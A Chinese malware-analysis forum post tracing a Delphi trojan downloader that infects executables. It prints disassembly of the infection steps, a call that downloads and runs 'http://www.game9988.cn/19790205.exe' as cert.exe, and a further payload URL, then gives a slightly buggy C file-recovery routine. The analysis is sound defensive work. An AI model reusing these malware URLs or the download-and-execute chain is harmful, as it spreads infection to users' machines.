
# trojan.downloader.win32.delf.ayu

> 原文：`www.pediy.com/kssd/pediy08/pediy8-342.htm`

**病毒名称**：`trojan.downloader.win32.delf.ayu`

**分析环境**：`vmware` + `win2000` + `vc6.0` + `od`

**说明**：今天开机，发现运行程序怪异，运行 `*.exe` 程序，会在当前目录下生成 `*~.exe` 文件，开始还认为是系统错误，又运行了另一个，还是这个问题，感觉不对，用咔吧大叔扫了下，结果整个系统目录下的 `exe` 文件（除系统文件）都报有毒，喀吧不能把正常程序还原，只能全删。当时就一个郁闷。这么多软件，怎么可能全删除，删了还怕系统不稳，只好怒而分析之。hoho，好久没有来论坛了，经验不敢独享，与和我一样迷茫的论坛菜菜们一起共享之。

## 正文

`peid` 载入感染的程序，显示 `Borland Delphi 6.0 - 7.0 [Overlay]`。

用资源文件打开查看 `import`：发现 `urlmon.dll->URLDownLoadToFile()`。这个是典型的下载者的标志。用 `od` 载入，下断点 `bp URLDownloadToFileA`，因为有读写文件，又下了下面几个断点：`bp CreateFileA`, `ReadFile`, `WriteFile`。

`F9` 运行，中断后 `ALT+F9`：

```
00406E99   |.   6A 00            push 0
00406E9B   |.   68 80000000      push 80
00406EA0   |.   6A 03            push 3
00406EA2   |.   6A 00            push 0
00406EA4   |.   8BC3            mov eax,ebx
00406EA6   |.   25 F0000000      and eax,0F0
00406EAB   |.   C1E8 04          shr eax,4
00406EAE   |.   8B0485 4451410> mov eax,dword ptr ds:[eax*4+415144]
00406EB5   |.   50              push eax
00406EB6   |.   8B04B5 3851410> mov eax,dword ptr ds:[esi*4+415138]
00406EBD   |.   50              push eax
00406EBE   |.   8BC7            mov eax,edi
00406EC0   |.   E8 1BD0FFFF      call QQLLK.00403EE0
00406EC5   |.   50              push eax                        ; |FileName
00406EC6   |.   E8 75E8FFFF      call <jmp.&kernel32.CreateFileA> ; \CreateFileA
00406ECB   |>   5F              pop edi                         ;  00C70020
00406ECC   |.   5E              pop esi
00406ECD   |.   5B              pop ebx
00406ECE   \.   C3              retn
```

各参数的意义为：

`CreateFileA("VIRUS.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NORMAL, NULL);`

`F9` 运行，`ALT+F9` 返回到：

```
00406EFC   /$   53              push ebx
00406EFD   |.   56              push esi
00406EFE   |.   57              push edi
00406EFF   |.   51              push ecx
00406F00   |.   8BF9            mov edi,ecx
00406F02   |.   8BF2            mov esi,edx
00406F04   |.   8BD8            mov ebx,eax
00406F06   |.   6A 00            push 0                          ; /pOverlapped = NULL
00406F08   |.   8D4424 04        lea eax,dword ptr ss:[esp+4]      ; |
00406F0C   |.   50              push eax                        ; |pBytesRead
00406F0D   |.   57              push edi                        ; |BytesToRead
00406F0E   |.   56              push esi                        ; |Buffer
00406F0F   |.   53              push ebx                        ; |hFile
00406F10   |.   E8 4BE9FFFF      call <jmp.&kernel32.ReadFile>     ; \ReadFile
00406F15   |.   85C0            test eax,eax
00406F17   |.   75 07           jnz short QQLLK.00406F20
00406F19   |.   C70424 FFFFFFF> mov dword ptr ss:[esp],-1
00406F20   |>   8B0424          mov eax,dword ptr ss:[esp]
00406F23   |.   5A              pop edx
00406F24   |.   5F              pop edi
00406F25   |.   5E              pop esi
00406F26   |.   5B              pop ebx
00406F27   \.   C3              retn
```

函数的表现形式为：

`ReadFile((hFile)0068, (Buffer)00137848, (BytesToRead)29a04, (pBytesRead)0012ff14, NULL);`

`F9`, `ALT+F9` 继续到这：

```
00406ED0   /$   53              push ebx
00406ED1   |.   8BD8            mov ebx,eax
00406ED3   |.   6A 00            push 0
00406ED5   |.   68 80000000      push 80
00406EDA   |.   6A 02            push 2
00406EDC   |.   6A 00            push 0
00406EDE   |.   6A 00            push 0
00406EE0   |.   68 000000C0      push C0000000
00406EE5   |.   8BC3            mov eax,ebx
00406EE7   |.   E8 F4CFFFFF      call QQLLK.00403EE0
00406EEC   |.   50              push eax                        ; |FileName
00406EED   |.   E8 4EE8FFFF      call <jmp.&kernel32.CreateFileA> ; \CreateFileA
00406EF2   |.   5B              pop ebx
00406EF3   \.   C3              retn

00406EF4   /$   E8 D7FFFFFF      call QQLLK.00406ED0
00406EF9   \.   C3              retn
```

函数的表现形式为：

`CreateFile("virus~.exe", GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, NORMAL, NULL);`

同上继续来到：

```
00406F29   |.   56              push esi                        ;  QQLLK.0040F628
00406F2A   |.   57              push edi
00406F2B   |.   51              push ecx
00406F2C   |.   8BF9            mov edi,ecx
00406F2E   |.   8BF2            mov esi,edx
00406F30   |.   8BD8            mov ebx,eax
00406F32   |.   6A 00            push 0                          ; /pOverlapped = NULL
00406F34   |.   8D4424 04        lea eax,dword ptr ss:[esp+4]      ; |
00406F38   |.   50              push eax                        ; |pBytesWritten
00406F39   |.   57              push edi                        ; |nBytesToWrite
00406F3A   |.   56              push esi                        ; |Buffer
00406F3B   |.   53              push ebx                        ; |hFile
00406F3C   |.   E8 5FE9FFFF      call <jmp.&kernel32.WriteFile>      ; \WriteFile
00406F41   |.   85C0            test eax,eax
00406F43   |.   75 07           jnz short QQLLK.00406F4C
00406F45   |.   C70424 FFFFFFF> mov dword ptr ss:[esp],-1
00406F4C   |>   8B0424          mov eax,dword ptr ss:[esp]
00406F4F   |.   5A              pop edx
00406F50   |.   5F              pop edi
00406F51   |.   5E              pop esi
00406F52   |.   5B              pop ebx
00406F53   \.   C3              retn
```

函数的表现形式为

`WriteFile(hFile, 00161860, 61952, 0012ff1c, NULL);`

一路继续跟踪来到：

```
00413FD4   |.   68 24404100      push QQLLK.00414024
00413FD9   |.   64:FF30          push dword ptr fs:[eax]
00413FDC   |.   64:8920          mov dword ptr fs:[eax],esp
00413FDF   |.   6A 00            push 0
00413FE1   |.   68 00000004      push 4000000
00413FE6   |.   6A 03            push 3
00413FE8   |.   6A 00            push 0
00413FEA   |.   6A 01            push 1
00413FEC   |.   6A 00            push 0
00413FEE   |.   8B45 FC          mov eax,dword ptr ss:[ebp-4]
00413FF1   |.   E8 EAFEFEFF      call QQLLK.00403EE0
00413FF6   |.   8BF0            mov esi,eax                       ; |
00413FF8   |.   56              push esi                      ; |FileName
00413FF9  |.  E8 4217FFFF       call <jmp.&kernel32.CreateFileA>
; \CreateFileA

00413FFE   |.   8BD8            mov ebx,eax
00414000   |.   6A 04            push 4                      ; /ShowState = SW_SHOWNOACTIVATE
00414002   |.   56              push esi                        ; |CmdLine
00414003   |.   E8 9018FFFF      call <jmp.&kernel32.WinExec>       ; \WinExec
```

`CreateFile("virus~.exe", 0, FILE_SHARE_READ, NULL, OPEN_EXISTIG, DELETE_ON_CLOSE, NULL)`

`WinExec("virus~.exe", SW_SHOWNOACTIVATE).`

后又跟踪来到：

```
004142E9   |. / 75 50            jnz short QQLLK.0041433B
004142EB   |. | 8D45 F4          lea eax,dword ptr ss:[ebp-C]
004142EE   |. | E8 21FEFFFF      call QQLLK.00414114
004142F3   |. | 8D45 F4          lea eax,dword ptr ss:[ebp-C]
004142F6   |. | BA 80434100      mov edx,QQLLK.00414380                ;  ASCII "cert.exe"
004142FB   |. | E8 E8F9FEFF      call QQLLK.00403CE8
00414300   |. | 8B55 F4          mov edx,dword ptr ss:[ebp-C]
```

; `00414394`= `QQLLK.00414394` (`ASCII "http://www.game9988.cn/19790205.exe"`)



```
00414303   . |B8 94434100    mov eax,QQLLK.00414394                          ;  ASCII "http://www.game9988.cn/19790205.exe"  

00414308   . |E8 03FFFFFF    call QQLLK.00414210  

0041430D   . |84C0           test al,al  

0041430F   . |74 2A          je short QQLLK.0041433B  

00414311   . |6A 00          push 0  
```

跟进上面的 `call` 来到：

```
00414219    .  8955 F8        mov dword ptr ss:[ebp-8],edx  
0041421C    .  8945 FC        mov dword ptr ss:[ebp-4],eax  
0041421F    .  8B45 FC        mov eax,dword ptr ss:[ebp-4]  
00414222    .  E8 A9FCFEFF    call QQLLK.00403ED0  
00414227    .  8B45 F8        mov eax,dword ptr ss:[ebp-8]  
0041422A    .  E8 A1FCFEFF    call QQLLK.00403ED0  
0041422F    .  33C0           xor eax,eax  
00414231    .  55             push ebp  
00414232    .  68 9E424100    push QQLLK.0041429E  
00414237    .  64:FF30        push dword ptr fs:[eax]  
0041423A    .  64:8920        mov dword ptr fs:[eax],esp  
0041423D    .  33C0           xor eax,eax  
0041423F    .  55             push ebp  
00414240    .  68 77424100    push QQLLK.00414277  
00414245    .  64:FF30        push dword ptr fs:[eax]  
00414248    .  64:8920        mov dword ptr fs:[eax],esp  
0041424B    .  6A 00          push 0  
0041424D    .  6A 00          push 0  
0041424F    .  8B45 F8        mov eax,dword ptr ss:[ebp-8]  
00414252    .  E8 89FCFEFF    call QQLLK.00403EE0  
00414257    .  50             push eax  
00414258    .  8B45 FC        mov eax,dword ptr ss:[ebp-4]  
0041425B    .  E8 80FCFEFF    call QQLLK.00403EE0  
00414260    .  50             push eax  
00414261    .  6A 00          push 0  
00414263    .  E8 ACE7FFFF    call <jmp.&URLMON.URLDownloadToFileA>  
```

函数的表现为：

`URLDownloadToFileA(0, "http://www.game9988.cn/19790205.exe", "C:\WINNT\cert.exe", 0)`

到这里， 用下载工具把 `19790205.exe` 下了回来，用 `aspack` 加了个壳，脱壳后发现

里面有个 `dll` 的资源文件，是一个 `com` 组件，又 `19790205` 对它进行调用，后来又看了

下这个 `dll`，竟然又有下载 `http://www.js-game.cn/url\_.txt`,里面又有几个地址连接。不继续了。通过上面解析大概知道了它的流程如下：

`CreateFile->ReadFile->CreateFile->WriteFile->WinExecFile->URLDownloadToFileA`

`\->(regsvr32 dll)...`

为了我的软件，作了一个分离模块，

```c
bool RecoverFile(char* filePath)  
{  
  HANDLE hFile =CreateFile(filePath,  
    GENERIC_READ,  
    FILE_SHARE_READ,  
    NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL);  
  if(INVALID_HANDLE_VALUE == hFile)  
    return false;  
  DWORD fSize;  
  fSize = GetFileSize(hFile, NULL);  
  char *Buffer;  
  Buffer = (char *)malloc(fSize+1);  
  DWORD rSize = 0;  
  ReadFile(hFile,(LPVOID)Buffer, fSize, &rSize, NULL);  
  if(0 == rSize)  
    return false  
  CloseHandle(hFile);  
  DeleteFile(filePath);  
  hFile = CreateFile(filePath,  
    GENERIC_READ|GENERIC_WRITE, 0, NULL,  
    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);  
  if(INVALID_HANDLE_VALUE == hFile)  
    return false;  
  WriteFile(hFile, Buffer+0x1a800,fSize-0x1a800,&rSize,NULL);  
  CloseHandle(hFile);  
  delete Buffer;  
  return true;  
}
```

没有过多的考虑，直接把病毒自生文件的大小（`0x1a800`）做为指针的偏移，把咔吧大叔扫描的结果路径提取做为参数，我的程序终于又重见天日了。

感谢看雪里面的前辈们，正是通过学到了他们的些许皮毛，才获得了一点收获

强烈 `bs` 国内的这些不道德的黑客，不做技术研究，专干这些伤天害理的勾当。 

`4dd466d0e1e0cc123afbe504da2462ca`
